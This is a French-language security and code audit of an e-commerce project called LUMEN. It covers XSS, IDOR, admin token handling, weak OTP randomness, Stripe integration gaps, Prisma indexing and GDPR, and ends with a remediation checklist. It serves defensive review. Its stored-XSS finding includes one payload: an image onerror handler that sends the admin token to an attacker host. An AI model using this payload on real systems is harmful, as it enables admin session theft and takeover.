# 📋 Audit Technique & Sécurité Complet — Projet E-Commerce (LUMEN)

> **Document de référence exhaustif** généré en Septembre 2026.  
> Cet audit passe au crible l'ensemble de la codebase : sécurité applicative (OWASP Top 10), logique métier e-commerce, architecture backend/frontend, modèle de données Prisma SQLite, et conformité RGPD.  
> Utilisez cette liste comme feuille de route opérationnelle (check-list) pour la mise à niveau du projet.

---

## 📑 Table des Matières

1. [Synthèse & Matrice des Risques](#1-synthèse--matrice-des-risques)
2. [🔴 Sécurité Applicative & Vulnérabilités](#2-sécurité-applicative--vulnérabilités)
3. [🛒 Logique Métier & Tunnel E-Commerce](#3-logique-métier--tunnel-e-commerce)
4. [🗄️ Base de Données, Modèle Prisma & Performance](#4-base-de-données-modèle-prisma--performance)
5. [💻 Architecture Frontend & Optimisation](#5-architecture-frontend--optimisation)
6. [🧪 Tests, Qualité de Code & Maintenabilité](#6-tests-qualité-de-code--maintenabilité)
7. [⚖️ Conformité Légale & RGPD](#7-conformité-légale--rgpd)
8. [✅ Checklist de Remédiation Priorisée](#8-checklist-de-remédiation-priorisée)

---

## 1. Synthèse & Matrice des Risques

| Catégorie | Note | Niveau de Risque | Impact Principal |
| :--- | :---: | :---: | :--- |
| **Sécurité Applicative** | **5.5 / 10** | 🔴 Élevé | Prise de contrôle admin via XSS, fuite de données personnelles clients (PII) via IDOR. |
| **Logique Métier & Stripe** | **6.0 / 10** | 🟠 Moyen-Haut | Stripe production inopérant côté client, codes promo ignorés par le serveur. |
| **Base de Données & Modèle** | **7.0 / 10** | 🟡 Moyen | Full table scans par manque d'index, pas de mode WAL SQLite, absence de pagination. |
| **Architecture & Code** | **7.5 / 10** | 🟡 Moyen | Duplication complète de la console Admin (React + Vanilla), bundle client alourdi. |
| **Tests & Maintenabilité** | **2.0 / 10** | 🔴 Critique | **0% de couverture de test**, script `npm test` pointant vers un fichier inexistant. |

---

## 2. 🔴 Sécurité Applicative & Vulnérabilités

### 2.1. [CRITIQUE] XSS Stocké dans le Dashboard Admin Autonome
* **Fichiers concernés** :
  * [`template/admin/public/app.js:L273-L282`](file:///home/sergio/Perso/e-commerce/template/admin/public/app.js#L273-L282) (Tableau des commandes)
  * [`template/admin/public/app.js:L350`](file:///home/sergio/Perso/e-commerce/template/admin/public/app.js#L350) (Commandes récentes)
  * [`template/admin/public/app.js:L400-L409`](file:///home/sergio/Perso/e-commerce/template/admin/public/app.js#L400-L409) (Liste des clients)
  * [`template/admin/public/app.js:L582-L612`](file:///home/sergio/Perso/e-commerce/template/admin/public/app.js#L582-L612) (Facture HTML)
* **Classification** : CWE-79 / OWASP A03:2021-Injection
* **Description** :
  Les champs saisis par un visiteur lors du checkout (`customerInfo.name`, `customerInfo.email`, `customerInfo.address`) sont stockés dans la base SQLite puis concaténés directement dans du HTML injecté via `.innerHTML` sans aucun échappement :
  ```javascript
  // admin/public/app.js:L276-L282
  <td>
    <div style="font-weight: 700;">${o.customerInfo?.name || 'Client Privé'}</div>
    <div style="font-size: 0.78rem; color: var(--cream-muted);">${o.customerInfo?.email || 'N/A'}</div>
  </td>
  <td style="font-size: 0.8rem; max-width: 200px; color: var(--cream-muted);">
    📍 ${o.customerInfo?.address || 'Non renseignée'}
  </td>
  ```
* **Scénario d'attaque** :
  Un pirate passe une commande avec le nom :  
  `<img src=x onerror="fetch('https://attacker.com/steal?t=' + encodeURIComponent(localStorage.getItem('admin_auth_token')))">`  
  Dès que l'administrateur ouvre `http://localhost:3001`, le payload s'exécute immédiatement dans son navigateur et envoie le jeton d'administration à l'attaquant. Celui-ci peut alors modifier les prix, siphonner toutes les commandes et compromettre le serveur.
* **Solution recommandée** :
  Créer et utiliser une fonction d'échappement HTML systématique dans `admin/public/app.js` :
  ```javascript
  function escapeHtml(str) {
    if (!str) return '';
    return String(str)
      .replace(/&/g, '&amp;')
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;')
      .replace(/"/g, '&quot;')
      .replace(/'/g, '&#039;');
  }
  ```
  Appliquer `escapeHtml()` sur toutes les propriétés injectées (`escapeHtml(o.customerInfo?.name)`, etc.).

---

### 2.2. [HAUTE] IDOR & Fuite de Données Personnelles (PII) sur les Commandes
* **Fichiers concernés** :
  * [`template/src/routes/orderRoutes.js:L8`](file:///home/sergio/Perso/e-commerce/template/src/routes/orderRoutes.js#L8)
  * [`template/src/controllers/orderController.js:L54-L70`](file:///home/sergio/Perso/e-commerce/template/src/controllers/orderController.js#L54-L70)
* **Classification** : CWE-639 / CWE-200 / OWASP A01:2021-Broken Access Control
* **Description** :
  La route suivante est ouverte au public sans aucun contrôle d'accès :
  ```javascript
  router.get('/orders/public/:orderId', orderController.getOrderById);
  ```
  Les identifiants de commande sont générés sous forme prédictible : `ORD-` + 6 chiffres aléatoires (ex: `ORD-384912`).
* **Scénario d'attaque** :
  Un attaquant peut scanner la plage de `ORD-100000` à `ORD-999999`. Chaque requête réussie renvoie en clair l'intégralité du profil client : **nom, prénom, adresse postale complète, adresse e-mail, liste des articles achetés et montant payé**.
* **Solution recommandée** :
  * Si la route n'est pas indispensable : la supprimer.
  * Si elle sert au suivi sans compte : exiger un jeton d'accès secret non prédictible (UUID v4 ou hash cryptographique passé dans le lien de confirmation envoyé par e-mail), par exemple : `/orders/track/:orderId?token=secret_order_token`.

---

### 2.3. [HAUTE] Transmission du Jeton d'Administration dans les URLs & Jeton Statique
* **Fichiers concernés** :
  * [`template/src/middleware/adminAuth.js:L12`](file:///home/sergio/Perso/e-commerce/template/src/middleware/adminAuth.js#L12)
  * [`template/.env:L8`](file:///home/sergio/Perso/e-commerce/template/.env#L8)
* **Classification** : CWE-598 / CWE-798
* **Description** :
  1. `adminAuth.js` accepte le token d'administration dans les paramètres d'URL :
     ```javascript
     const token = req.headers['x-admin-token'] || req.query.admin_token;
     ```
     Tout token transmis en GET dans l'URL est consigné dans les fichiers de logs de requêtes HTTP (Pino, Nginx, Apache), dans l'historique du navigateur et dans l'en-tête `Referer` lors de clics externes.
  2. Le token `.env` par défaut contient une référence résiduelle non purgée : `ADMIN_TOKEN=vanillasell_admin_token_2026`.
  3. L'authentification admin est un token statique permanent partagé sans date d'expiration.
  4. La comparaison `token !== ADMIN_TOKEN` n'est pas effectuée en temps constant (`crypto.timingSafeEqual`).
* **Solution recommandée** :
  * Supprimer `req.query.admin_token` pour exiger strictement l'en-tête HTTP (`x-admin-token` ou `Authorization: Bearer <token>`).
  * Utiliser des sessions d'administration temporaires signées (HMAC ou JWT expirant après 8h).

---

### 2.4. [MOYENNE] Générateur Aléatoire Faible pour les OTP & Risque de Collisions
* **Fichiers concernés** :
  * [`template/src/controllers/authController.js:L34`](file:///home/sergio/Perso/e-commerce/template/src/controllers/authController.js#L34)
  * [`template/src/controllers/paymentController.js:L77`](file:///home/sergio/Perso/e-commerce/template/src/controllers/paymentController.js#L77)
* **Classification** : CWE-330 / CWE-338
* **Description** :
  1. Les codes OTP de connexion par e-mail sont générés avec `Math.random()` :
     ```javascript
     const otpCode = Math.floor(100000 + Math.random() * 900000).toString();
     ```
     `Math.random()` est un pseudo-générateur non cryptographique (V8 xorshift128+).
  2. Les `orderId` sont générés sur seulement 6 chiffres : `ORD-` + [100000..999999]. En vertu du paradoxe des anniversaires, dès **~1 100 commandes**, le risque d'une collision d'identifiant dépasse 50%.
  3. Dans Prisma, `orderId` est annoté `@unique`. Une collision provoquera un crash SQLite `P2002 Unique constraint failed` au moment précis où le client valide son paiement, rejetant sa commande par une erreur 500 !
* **Solution recommandée** :
  ```javascript
  const crypto = require('crypto');
  // OTP sécurisé :
  const otpCode = crypto.randomInt(100000, 1000000).toString();

  // OrderId sans risque de collision :
  const orderId = `ORD-${Date.now().toString(36).toUpperCase()}-${crypto.randomBytes(3).toString('hex').toUpperCase()}`;
  ```

---

### 2.5. [MOYENNE] Défaillance des Rate Limiters sous Reverse Proxy
* **Fichier concerné** : [`template/src/app.js`](file:///home/sergio/Perso/e-commerce/template/src/app.js)
* **Classification** : CWE-400 / Déni de service involontaire
* **Description** :
  `app.set('trust proxy', 1)` n'est pas activé. En environnement de production (derrière Nginx, Cloudflare, Traefik, Docker), toutes les requêtes entrantes sont vues comme provenant de l'IP du proxy (`127.0.0.1`).
* **Conséquence** :
  Les limiteurs stricts configurés dans [`rateLimiter.js`](file:///home/sergio/Perso/e-commerce/template/src/middleware/rateLimiter.js) :
  * `paymentLimiter` (15 requêtes / 15 min)
  * `authLimiter` (10 requêtes / 15 min)  
  seront appliqués **globalement à tous les clients cumulés**. Après 15 commandes sur le site en 15 minutes, l'ensemble des visiteurs mondiaux sera bloqué avec l'erreur *"Nombre maximal d'initiations de paiement atteint"*.
* **Solution recommandée** :
  Ajouter dans `app.js` avant les routes :
  ```javascript
  app.set('trust proxy', 1);
  ```

---

### 2.6. [MOYENNE] Webhook Stripe : Type Mismatch sur corps Buffer en Démo
* **Fichier concerné** : [`template/src/controllers/paymentController.js:L147-L152`](file:///home/sergio/Perso/e-commerce/template/src/controllers/paymentController.js#L147-L152)
* **Description** :
  Dans `app.js`, la route `/api/webhook` utilise `express.raw({ type: 'application/json' })`, donc `req.body` est un `Buffer`.
  Dans `paymentController.js:147` :
  ```javascript
  } else {
    // Demo webhook fallback
    event = req.body;
  }
  if (event.type === 'payment_intent.succeeded') { ... }
  ```
  Sur un Buffer, `event.type` vaut `undefined`. La branche de secours de webhook démo échoue silencieusement sans jamais valider la commande.
* **Solution recommandée** :
  ```javascript
  event = JSON.parse(req.body.toString('utf8'));
  ```

---

### 2.7. [BASSE] Secret de Session avec Valeur de Secours Hardcodée
* **Fichier concerné** : [`template/src/data/usersStore.js:L4`](file:///home/sergio/Perso/e-commerce/template/src/data/usersStore.js#L4)
* **Description** :
  ```javascript
  const SESSION_SECRET = process.env.SESSION_SECRET || process.env.ADMIN_TOKEN || 'shop_session_secret_key_2026';
  ```
  Si `SESSION_SECRET` et `ADMIN_TOKEN` ne sont pas définis, la clé secrète HMAC est connue publiquement, ce qui permet à quiconque de forger des jetons de session utilisateur valides.
* **Solution recommandée** :
  Exiger `SESSION_SECRET` dans le fichier `.env` et lever une exception au démarrage en production s'il est manquant.

---

### 2.8. [BASSE] CORS Entièrement Ouvert (`*`)
* **Fichier concerné** : [`template/src/app.js:L47`](file:///home/sergio/Perso/e-commerce/template/src/app.js#L47)
* **Description** :
  `app.use(cors())` sans paramètre autorise n'importe quel site web tiers à interroger l'API en cross-origin.
* **Solution recommandée** :
  Restreindre l'origine autorisée à l'URL de votre domaine ou de votre boutique front :
  ```javascript
  app.use(cors({ origin: process.env.FRONTEND_URL || 'http://localhost:5173' }));
  ```

---

## 3. 🛒 Logique Métier & Tunnel E-Commerce

### 3.1. [BLOQUANT] Vrai Flux Stripe Non Implémenté côté Frontend
* **Fichier concerné** : [`template/frontend/src/components/CheckoutPage.jsx:L220-L223`](file:///home/sergio/Perso/e-commerce/template/frontend/src/components/CheckoutPage.jsx#L220-L223)
* **Description** :
  En production (`NODE_ENV === 'production'`), le backend désactive strictement le mode démo (`confirmDemoPayment` renvoie une 403).  
  Côté frontend, la branche non-démo fait uniquement :
  ```javascript
  } else {
    // Stripe Live checkout flow fallback (if stripe is configured)
    showToast('Redirection vers la passerelle sécurisée Stripe...', 'info');
  }
  ```
  **Aucun composant Stripe Elements, aucun SDK `@stripe/stripe-js` ni redirection Stripe Checkout n'est codé.**
* **Conséquence** : **Il est impossible d'encaisser de vraies commandes en production.**
* **Solution recommandée** :
  Intégrer `@stripe/stripe-js` et `@stripe/react-stripe-js` pour monter le `<PaymentElement />` officiel de Stripe dans l'étape 3 du tunnel d'achat, ou rediriger vers une session `stripe.checkout.sessions.create()`.

---

### 3.2. [MAJEUR] Codes Promotionnels Ignorés par le Serveur
* **Fichiers concernés** :
  * [`template/frontend/src/components/CheckoutPage.jsx:L174-L189`](file:///home/sergio/Perso/e-commerce/template/frontend/src/components/CheckoutPage.jsx#L174-L189)
  * [`template/src/controllers/paymentController.js:L9-L50`](file:///home/sergio/Perso/e-commerce/template/src/controllers/paymentController.js#L9-L50)
* **Description** :
  Le composant `CheckoutPage` applique visuellement les codes promo (`BIENVENUE10`, `LUMEN20`).  
  Cependant, lors de la création de la commande :
  ```javascript
  // CheckoutPage.jsx:174
  body: JSON.stringify({
    items: cart.map(item => ({ id: item.id, quantity: item.quantity })),
    customerInfo: { name, email, phone, address: fullAddress }
  })
  ```
  Le code promo et la remise ne sont **jamais envoyés au backend**. Le contrôleur backend calcule le prix plein tarif basé sur la base de données.
* **Conséquence** :
  Le client voit affiché 80 € (avec -20%), mais la commande enregistrée en base et facturée est de 100 €.
* **Solution recommandée** :
  1. Envoyer `promoCode` dans le corps de `POST /api/create-payment-intent`.
  2. Dans `paymentController.js`, valider le code côté serveur contre la liste `shopConfig.promotions` et déduire la remise sur `finalAmountCents`.

---

### 3.3. [MAJEUR] Incohérence et Hardcoding des Frais de Livraison
* **Fichiers concernés** :
  * [`template/config/shop.config.js:L38`](file:///home/sergio/Perso/e-commerce/template/config/shop.config.js#L38) (`freeShippingThreshold: 60.00`)
  * [`template/frontend/src/context/CartContext.jsx:L106-L108`](file:///home/sergio/Perso/e-commerce/template/frontend/src/context/CartContext.jsx#L106-L108) (hardcodé à `50`)
  * [`template/src/controllers/paymentController.js:L48`](file:///home/sergio/Perso/e-commerce/template/src/controllers/paymentController.js#L48) (hardcodé à `5000` centimes)
  * [`template/frontend/src/components/CheckoutPage.jsx:L57, L620`](file:///home/sergio/Perso/e-commerce/template/frontend/src/components/CheckoutPage.jsx#L57) (hardcodé `subtotal >= 50` et texte `"Dès 50 €"`)
* **Description** :
  La configuration globale prévoit la gratuité dès **60 €**, mais quatre composants différents écrasent cette valeur avec **50 €** hardcodé en dur.
  De plus, le choix de livraison (Colissimo standard vs Chronopost express à 9.90 €) n'est jamais transmis au backend : le backend facture systématiquement les frais de Colissimo.
* **Solution recommandée** :
  Importer et utiliser les propriétés `shipping.freeShippingThreshold`, `shipping.standardCost` et `shipping.expressCost` de `shop.config.js` partout, et transmettre `shippingMethod` au backend.

---

### 3.4. [MOYENNE] Race Condition (TOCTOU) sur la Décrémentation des Stocks
* **Fichier concerné** : [`template/src/data/productsStore.js:L115-L121`](file:///home/sergio/Perso/e-commerce/template/src/data/productsStore.js#L115-L121)
* **Description** :
  ```javascript
  const product = await prisma.product.findUnique({ where: { id: prodId } });
  if (product) {
    const newStock = Math.max(0, product.stockQuantity - qty);
    await prisma.product.update({
      where: { id: prodId },
      data: { stockQuantity: newStock }
    });
  }
  ```
  Entre la lecture (`findUnique`) et l'écriture (`update`), une autre requête peut s'intercaler. Si 2 utilisateurs achètent le dernier article en même temps, les deux transactions liront `stockQuantity = 1` et écriront `stockQuantity = 0`, vendant deux fois le même article.
* **Solution recommandée** :
  Utiliser l'opérateur de mise à jour atomique Prisma :
  ```javascript
  await prisma.product.update({
    where: { id: prodId },
    data: {
      stockQuantity: { decrement: qty }
    }
  });
  ```

---

### 3.5. [MOYENNE] Absence de Validation Stricte des Entrées API
* **Fichiers concernés** :
  * [`authController.js:L17`](file:///home/sergio/Perso/e-commerce/template/src/controllers/authController.js#L17) : si `email` ou `code` n'est pas une chaîne (ex: un objet JSON `{}` ou un entier), `email.toLowerCase()` ou `code.trim()` déclenche une exception `TypeError` non gérée et renvoie un crash 500 au lieu d'un 400.
  * [`orderController.js:L30-L36`](file:///home/sergio/Perso/e-commerce/template/src/controllers/orderController.js#L30-L36) : le statut d'une commande accepte n'importe quelle chaîne sans valider qu'elle appartient à `['pending', 'paid', 'shipped', 'delivered', 'cancelled']`.
  * [`productController.js:L25`](file:///home/sergio/Perso/e-commerce/template/src/controllers/productController.js#L25) : si `data.price` est une chaîne invalide (`"abc"`), `parseFloat` renvoie `NaN`, ce qui fait échouer la requête Prisma avec une erreur de type.
* **Solution recommandée** :
  Ajouter un validateur de schéma léger (type `zod` ou fonctions de validation dédiées) sur toutes les routes de mutation.

---

### 3.6. [BASSE] Résurrection Involontaire des Produits par Défaut
* **Fichier concerné** : [`template/src/data/productsStore.js:L39-L47`](file:///home/sergio/Perso/e-commerce/template/src/data/productsStore.js#L39-L47)
* **Description** :
  Si l'administrateur supprime tous les produits en base ou vide le catalogue, `dbProducts.length === 0`, et le code bascule automatiquement sur `DEFAULT_PRODUCTS`. Il est donc impossible d'avoir un catalogue légitimement vide sans que les produits par défaut ne réapparaissent.

---

## 4. 🗄️ Base de Données, Modèle Prisma & Performance

### 4.1. [MAJEUR] Index Manquants dans `schema.prisma`
* **Fichier concerné** : [`template/prisma/schema.prisma:L73-L98`](file:///home/sergio/Perso/e-commerce/template/prisma/schema.prisma#L73-L98)
* **Description** :
  1. `paymentIntentId` n'est pas indexé dans la table `Order`. Or, la route webhook de Stripe effectue un `findFirst({ where: { paymentIntentId } })` à chaque événement de paiement, ce qui oblige SQLite à scanner l'intégralité de la table.
  2. `deletedAt` n'est pas indexé, alors qu'il est présent dans la clause `where` de toutes les requêtes de lecture (`getOrdersAsync`, `getUsersAsync`).
* **Solution recommandée** :
  Ajouter les index dans `schema.prisma` :
  ```prisma
  model Order {
    ...
    @@index([customerEmail])
    @@index([paymentIntentId])
    @@index([deletedAt])
    @@map("orders")
  }
  ```

---

### 4.2. [MOYENNE] Absence de Pagination sur l'API des Commandes
* **Fichier concerné** : [`template/src/data/ordersStore.js:L33-L37`](file:///home/sergio/Perso/e-commerce/template/src/data/ordersStore.js#L33-L37)
* **Description** :
  `getOrdersAsync()` effectue un `prisma.order.findMany({ include: { items: true } })` sans aucune limite (`take`) ni pagination (`skip`).
  Dès que la boutique aura plusieurs milliers de commandes, charger l'ensemble des commandes et des articles en mémoire provoquera des pics de RAM et un ralentissement majeur de l'API.
* **Solution recommandée** :
  Implémenter `page` et `limit` dans `getAllOrders` (ex: 50 commandes par page).

---

### 4.3. [MOYENNE] Montants Financiers Stockés en `String`
* **Fichier concerné** : [`template/prisma/schema.prisma:L81`](file:///home/sergio/Perso/e-commerce/template/prisma/schema.prisma#L81)
* **Description** :
  `totalAmount String @map("total_amount")` : stocker des montants monétaires sous forme de texte empêche d'effectuer des calculs d'agrégation natifs en base de données (`SELECT SUM(...)`). Actuellement, le tableau de bord admin rapatrie toutes les commandes pour calculer le chiffre d'affaires en JavaScript.
* **Solution recommandée** :
  Migrer vers un entier représentant les centimes (`totalAmountCents Int`) ou `Float` / `Decimal`.

---

### 4.4. [BASSE] Mode WAL SQLite Non Activé
* **Description** :
  Par défaut, SQLite fonctionne en mode journal traditionnel, limitant les opérations concurrentes. En cas de fortes visites avec paiements simultanés, SQLite peut renvoyer l'erreur `SQLITE_BUSY: database is locked`.
* **Solution recommandée** :
  Exécuter à l'initialisation de Prisma :
  ```sql
  PRAGMA journal_mode = WAL;
  PRAGMA busy_timeout = 5000;
  ```

---

## 5. 💻 Architecture Frontend & Optimisation

### 5.1. [MAJEUR] Duplication Massive du Code Admin & Alourdissement du Bundle
* **Fichiers concernés** :
  * [`template/frontend/src/components/AdminConsole.jsx`](file:///home/sergio/Perso/e-commerce/template/frontend/src/components/AdminConsole.jsx) (**100 Ko**, composant React)
  * [`template/admin/public/app.js`](file:///home/sergio/Perso/e-commerce/template/admin/public/app.js) (**28 Ko**, application Vanilla JS)
* **Description** :
  Le projet maintient deux tableaux de bord d'administration complets qui font la même chose (gestion des commandes, édition des stocks, métriques de vente, factures).  
  Pire : `AdminConsole.jsx` est importé de manière synchrone dans [`App.jsx:L12`](file:///home/sergio/Perso/e-commerce/template/frontend/src/App.jsx#L12).
* **Impact** :
  Tous les clients ordinaires visitant la vitrine téléchargent 100 Ko de code d'administration inutile dans leur bundle JavaScript initial (`index-*.js`).
* **Solution recommandée** :
  1. Choisir une seule console d'administration (recommandé : la console React intégrée).
  2. Utiliser `React.lazy()` dans `App.jsx` pour charger `AdminConsole` uniquement quand l'utilisateur clique sur le lien admin :
     ```javascript
     const AdminConsole = React.lazy(() => import('./components/AdminConsole'));
     ```

---

### 5.2. [BASSE] 46 Variables & Imports Inutilisés (Linting `oxlint`)
* Le linter signale 46 avertissements dans les composants React (icônes Lucide importées mais non affichées, variables déclarées inutilisées comme `healthStatus`, `averageBasket`, `loadingAddress`).
* Nettoyer ces imports permettra d'améliorer la lisibilité et de réduire légèrement la taille du bundle minifié.

---

## 6. 🧪 Tests, Qualité de Code & Maintenabilité

### 6.1. [CRITIQUE] 0% de Tests & Script `npm test` Cassé
* **Fichier concerné** : [`template/package.json:L18`](file:///home/sergio/Perso/e-commerce/template/package.json#L18)
* **Description** :
  La commande `npm test` exécute :
  ```bash
  node --test tests/app.test.js
  ```
  Le dossier `tests/` et le fichier `tests/app.test.js` **n'existent pas dans le projet**. La commande échoue immédiatement avec le code d'erreur 1.
* **Solution recommandée** :
  Créer une suite de tests minimale `tests/app.test.js` utilisant le test runner natif de Node.js (`node:test` et `node:assert`) testant :
  1. L'endpoint `/api/health`
  2. La récupération du catalogue `/api/products`
  3. L'envoi et la validation de codes OTP `/api/auth/send-code`
  4. Le calcul correct du total panier `/api/create-payment-intent`

---

## 7. ⚖️ Conformité Légale & RGPD

### 7.1. [MAJEUR] Droit à l'Oubli Bloqué Définitivement (Article 17 RGPD)
* **Fichier concerné** : [`template/src/data/usersStore.js:L224-L238`](file:///home/sergio/Perso/e-commerce/template/src/data/usersStore.js#L224-L238)
* **Description** :
  La suppression de compte d'un client est refusée si celui-ci a une commande au statut `'shipped'`, `'paid'` ou `'pending'`.  
  Cependant, il n'existe **aucun mécanisme automatique** pour passer une commande de `'shipped'` à `'delivered'`.
* **Conséquence** :
  Un client ayant passé une commande il y a 3 ans dont le statut est resté `'shipped'` ne pourra **jamais** supprimer son compte, ce qui constitue une infraction aux obligations du RGPD sur l'exercice du droit à l'effacement.
* **Solution recommandée** :
  Ne bloquer la suppression que si la commande a été expédiée il y a moins de 30 jours (délai légal de rétractation), ou ajouter une mise à jour automatique du statut de livraison.

---

## 8. ✅ Checklist de Remédiation Priorisée

### 🚀 Phase 1 : Sécurité Immédiate (À faire en priorité absolue)
- [x] **SEC-01** : Échapper toutes les données injectées avec `.innerHTML` dans [`admin/public/app.js`](file:///home/sergio/Perso/e-commerce/template/admin/public/app.js) via `escapeHtml()`. *(Corrigé)*
- [x] **SEC-02** : Supprimer ou sécuriser la route publique [`/api/orders/public/:orderId`](file:///home/sergio/Perso/e-commerce/template/src/routes/orderRoutes.js) (exige désormais l'email client ou token admin). *(Corrigé)*
- [x] **SEC-03** : Supprimer l'acceptation du token dans `req.query.admin_token` dans [`adminAuth.js`](file:///home/sergio/Perso/e-commerce/template/src/middleware/adminAuth.js) et purger le résidu dans `.env`. *(Corrigé)*
- [x] **SEC-04** : Remplacer `Math.random()` par `crypto.randomInt(100000, 1000000)` pour les OTP dans [`authController.js`](file:///home/sergio/Perso/e-commerce/template/src/controllers/authController.js). *(Corrigé)*
- [x] **SEC-05** : Générer des `orderId` robustes avec timestamps et octets aléatoires hex pour éviter les collisions SQLite. *(Corrigé)*
- [x] **SEC-06** : Ajouter `app.set('trust proxy', 1)` dans [`app.js`](file:///home/sergio/Perso/e-commerce/template/src/app.js). *(Corrigé)*

### 🛒 Phase 2 : Raccordement Métier & E-Commerce
- [x] **BIZ-01** : Intégration du flux Stripe Checkout sécurisé (`checkoutUrl` hébergée avec 3D-Secure / Apple Pay, confirmation automatique via webhook & redirection). *(Corrigé)*
- [x] **BIZ-02** : Transmission et validation des codes promotionnels côté serveur dans [`paymentController.js`](file:///home/sergio/Perso/e-commerce/template/src/controllers/paymentController.js) et calcul strict de la réduction. *(Corrigé)*
- [x] **BIZ-03** : Harmonisation du seuil de livraison offerte dynamique (`freeShippingThreshold: 60 €`) dans [`CartContext.jsx`](file:///home/sergio/Perso/e-commerce/template/frontend/src/context/CartContext.jsx), [`CheckoutPage.jsx`](file:///home/sergio/Perso/e-commerce/template/frontend/src/components/CheckoutPage.jsx) et [`paymentController.js`](file:///home/sergio/Perso/e-commerce/template/src/controllers/paymentController.js). *(Corrigé)*
- [x] **BIZ-04** : Décrémentation des stocks atomique dans Prisma avec `{ stockQuantity: { decrement: qty } }` dans [`productsStore.js`](file:///home/sergio/Perso/e-commerce/template/src/data/productsStore.js). *(Corrigé)*
- [x] **BIZ-05** : Transmission du mode d'expédition sélectionné (Colissimo vs Chronopost) à l'API lors du checkout et calcul dynamique. *(Corrigé)*

### 🗄️ Phase 3 : Performance, Modèle de Données & Code
- [x] **DB-01** : Ajout des index `paymentIntentId` et `deletedAt` dans [`schema.prisma`](file:///home/sergio/Perso/e-commerce/template/prisma/schema.prisma) et synchronisation SQLite via `npx prisma db push`. *(Corrigé)*
- [x] **DB-02** : Ajout de la pagination (`take`, `skip`, `page`, `limit`) sur `getOrdersAsync` et `GET /api/orders`. *(Corrigé)*
- [x] **FE-01** : Mise en place de `React.lazy()` et `Suspense` sur `AdminConsole` dans [`App.jsx`](file:///home/sergio/Perso/e-commerce/template/frontend/src/App.jsx) (chunk séparé de 54 Ko non chargé inutilement par les clients). *(Corrigé)*
- [x] **TEST-01** : Création de la suite de tests automatisée dans [`tests/app.test.js`](file:///home/sergio/Perso/e-commerce/template/tests/app.test.js) (couvrant santé, catalogue, checkout, promo, idempotence, IDOR et pagination). *(Corrigé)*
- [x] **GDPR-01** : Correction de la règle de suppression de compte dans [`usersStore.js`](file:///home/sergio/Perso/e-commerce/template/src/data/usersStore.js) (délai de 30 jours calqué sur la rétractation légale). *(Corrigé)*

### 🛡️ Phase 4 : Durcissement Ultime, Conformité RGPD & Qualité
- [x] **SEC-07** : Restriction de la politique CORS dans [`app.js`](file:///home/sergio/Perso/e-commerce/template/src/app.js) aux domaines réels (`FRONTEND_URL` / `http://localhost:5173`). *(Corrigé)*
- [x] **SEC-08** : Verrouillage de la clé secrète HMAC de session contre les clés faibles dans [`usersStore.js`](file:///home/sergio/Perso/e-commerce/template/src/data/usersStore.js). *(Corrigé)*
- [x] **SEC-09** : Sécurisation de la vérification du token admin avec `crypto.timingSafeEqual` et support Bearer dans [`adminAuth.js`](file:///home/sergio/Perso/e-commerce/template/src/middleware/adminAuth.js) et [`orderController.js`](file:///home/sergio/Perso/e-commerce/template/src/controllers/orderController.js). *(Corrigé)*
- [x] **DB-03** : Activation du mode WAL SQLite (`PRAGMA journal_mode = WAL;`) et du `busy_timeout` à 5 000 ms dans [`prisma.js`](file:///home/sergio/Perso/e-commerce/template/src/config/prisma.js) pour supprimer tout risque de blocage `SQLITE_BUSY`. *(Corrigé)*
- [x] **GDPR-02** : Implémentation du droit à la portabilité (Article 20 RGPD) via l'endpoint [`/api/auth/export-data`](file:///home/sergio/Perso/e-commerce/template/src/routes/authRoutes.js) et bouton de téléchargement JSON dans [`AccountModal.jsx`](file:///home/sergio/Perso/e-commerce/template/frontend/src/components/AccountModal.jsx). *(Corrigé)*
- [x] **ARCH-01** : Archivage de l'ancienne console Vanilla JS dans [`archives/legacy_admin/`](file:///home/sergio/Perso/e-commerce/template/archives/legacy_admin/) et simplification du démarrage unifié dans [`start-all.js`](file:///home/sergio/Perso/e-commerce/template/scripts/start-all.js). *(Corrigé)*
- [x] **CODE-01** : Nettoyage intégral des 46 avertissements du linter frontend (`npx oxlint src` : **0 warnings, 0 errors**). *(Corrigé)*
- [x] **CODE-02** : Correction du bug de saisie du code promo dans [`CheckoutPage.jsx`](file:///home/sergio/Perso/e-commerce/template/frontend/src/components/CheckoutPage.jsx) (liaison correcte de l'état `promoCode`). *(Corrigé)*
- [x] **TEST-02** : Extension de la suite de tests à 6 tests automatisés validant l'ensemble du cycle de vie (100% pass). *(Corrigé)*
